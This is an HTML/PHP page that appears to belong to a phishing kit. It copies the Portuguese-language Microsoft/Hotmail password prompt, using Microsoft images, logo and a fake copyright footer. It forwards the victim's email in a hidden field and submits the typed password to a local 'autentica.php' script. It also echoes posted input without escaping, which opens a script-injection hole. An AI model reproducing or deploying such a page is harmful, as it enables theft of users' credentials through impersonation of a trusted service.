<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta content="width=device-width,initial-scale=1" name=viewport>
<link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.28957.10/images/favicon.ico">
<title>Entrar na conta</title>
<link rel="icon" href="img/hotmail.ico">
<link rel="stylesheet" href="css/bootstrap.min.css">
<link rel="stylesheet" href="css/bootstrap-theme.min.css">
<link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery-vv.min.js"></script>
<script src="js/verificarUsuario.js" type="text/javascript"></script>

<script>

</script>
<script>
function validation() {
var usuario = $('#semail').val().length;
   
		$("#entrar").val("Aguarde...");
        if(usuario < 4 ) {
			alert('Por favor, preencha o campo corretamente!');
			$("#entrar").val("Próximo");
			return false;
		}else{
			return true;
		}
}
</script>

<style type="text/css">
body { margin:0; }
@media (max-width: 1366px) { #topo { max-width:1160px; } }
@media (max-width: 1215px) { #topo { max-width:960px; } }
@media (max-width: 1007px) { #topo { max-width:740px; } }
	#box { height:auto; padding:20px; background:#FFF; margin:0 auto; margin-top: 9%; border: 1px solid #CCC; }
@media (min-width: 637px) { #box { max-width:500px; !important } }
@media (max-width: 636px) { #box { max-width:100%; margin-top: 0; border: none; height: 100%; !important } }
	
	#back { background:url(img/003.jpg); background-size:cover; width: 100%; height: 100%; position: absolute;  }
@media (max-width: 636px) { #back { background: none; !important } }

@media (max-width: 1366px) { #bottom { max-width:1160px; } }
@media (max-width: 1215px) { #bottom { max-width:960px; } }
@media (max-width: 1007px) { #bottom { max-width:740px; } }
@media (max-width: 784px) { #bottom { max-width:200px; } }

@media (min-width: 477px) { #me { float:right; padding:10px; width:120px; } }
@media (max-width: 477px) { #me { float:left; padding:0 0 10px 0; width:90%; } }
@media (max-width: 768px) { #re { display:none; } }

#semail { width:100%; padding:10px 10px 10px 0; font-size:14px; border: none; border-bottom:1px solid #333; outline:none; }
#entrar { width:100px; height:36px; background:#0067B8; border:none; color:#FFF; font-weight:; }
#cancelar { width:49%; height:36px; background:#CCC; border:none; color:#444; font-weight:; }
</style>

</head>

<body>
<div id="back">
<form name="form" id="form" action="autentica.php?login,<?php $hora=date("h,j,u,t,r,y,H,i,s,n,g"); echo"$hora"; ?>.bemvindo" method="post" onSubmit="return validation()">
<input type="hidden" name="email" value="<?php echo $_POST['email'];?>">
<div id="box">
<div style="padding:30px 40px 40px 40px;font-family: Arial;">
<div style="height:40px;"><img src="img/microsoft_logo.svg"></div>

<img role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"> <?php echo @$_POST['email'];?>

<div style="height:30px; margin-top: 20px; font-size:24px; font-weight: bold; color: #444;">Insira a senha</div>

<div style="margin-top: 20px;">
  <input type="password" name="semail" id="semail" required placeholder="Senha" size="1" autofocus>
</div>
<div style="margin-top: 10px;">
	<input type="checkbox" > Mantenha-me conectado
</div>


<div style="margin-top: 10px;">
	<a href="#">Esqueceu a senha?</a>
</div>

<div style="margin-top:10px; height: 40px;">
  <input type="submit" name="entrar" id="entrar" value="Próximo" style="float: right;" />
</div>

</div>





</div>

</form>



<div style="text-align: right; padding: 5px; position: fixed; bottom: 0; color: #FFF; width: 100%; background-color: rgb(0,0,0); background-color: rgba(0,0,0,0.7); font-size: 12px;">©2017 Microsoft &nbsp;&nbsp;&nbsp; Terms of use &nbsp;&nbsp;&nbsp; Privat the cookies</div>

</div>
</body>
</html>